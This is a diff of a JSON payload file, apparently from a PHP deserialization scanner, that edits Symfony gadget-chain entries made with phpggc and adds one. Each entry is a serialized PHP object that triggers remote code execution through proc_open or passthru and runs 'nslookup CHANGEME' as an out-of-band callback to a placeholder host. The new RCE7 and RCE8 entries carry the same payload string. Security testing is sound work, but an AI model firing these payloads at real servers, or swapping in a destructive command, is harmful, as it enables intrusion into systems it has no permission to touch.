@@ -277,7 +277,7 @@
   },
   {
     "_needs_dynamic_payload_editing": false,
-    "name": "Symfony 3.3 (1)",
+    "name": "Symfony v3.1.0 <= v3.4.34 (1)",
     "gen_with": "./phpggc Symfony/RCE1 <command>",
     "payload": "O:43:\"Symfony\\Component\\Cache\\Adapter\\ApcuAdapter\":3:{s:64:\"%00Symfony\\Component\\Cache\\Adapter\\AbstractAdapter%00mergeByLifetime\"%3Bs:9:\"proc_open\"%3Bs:58:\"%00Symfony\\Component\\Cache\\Adapter\\AbstractAdapter%00namespace\"%3Ba:0:{}s:57:\"%00Symfony\\Component\\Cache\\Adapter\\AbstractAdapter%00deferred\"%3Bs:63:\"nslookup CHANGEME\"%3B}"
   },
@@ -313,8 +313,14 @@
   },
   {
     "_needs_dynamic_payload_editing": false,
-    "name": "Symfony ??? (7)",
+    "name": "Symfony v3.2.0 <= v3.4.34 v4.0.0 <= v4.2.11 v4.3.0 <= v4.3.7 (7)",
     "gen_with": "./phpggc Symfony/RCE7 <function> <parameter>",
+    "payload": "O:47:\"Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter\":2:{s:57:\"%00Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter%00deferred\"%3Bs:63:\"nslookup CHANGEME\"%3Bs:61:\"%00Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter%00getTagsByKey\"%3Bs:8:\"passthru\"%3B}"
+  },
+  {
+    "_needs_dynamic_payload_editing": false,
+    "name": "Symfony v3.4.0 <= v4.4.18 v5.0.0 <= v5.2.1 (8)",
+    "gen_with": "./phpggc Symfony/RCE8 <function> <parameter>",
     "payload": "O:47:\"Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter\":2:{s:57:\"%00Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter%00deferred\"%3Bs:63:\"nslookup CHANGEME\"%3Bs:61:\"%00Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter%00getTagsByKey\"%3Bs:8:\"passthru\"%3B}"
   },
   {
